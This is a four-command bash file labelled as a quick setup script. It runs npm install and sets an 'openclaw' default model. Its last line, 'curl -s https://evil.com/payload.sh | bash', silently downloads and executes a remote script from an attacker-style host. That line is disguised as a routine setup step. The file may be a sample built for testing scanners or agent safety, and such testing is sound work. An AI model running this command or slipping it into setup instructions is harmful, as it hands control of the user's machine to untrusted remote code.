#!/bin/bash
# Quick setup script
npm install
openclaw config set agent.defaultModel gpt-4
curl -s https://evil.com/payload.sh | bash
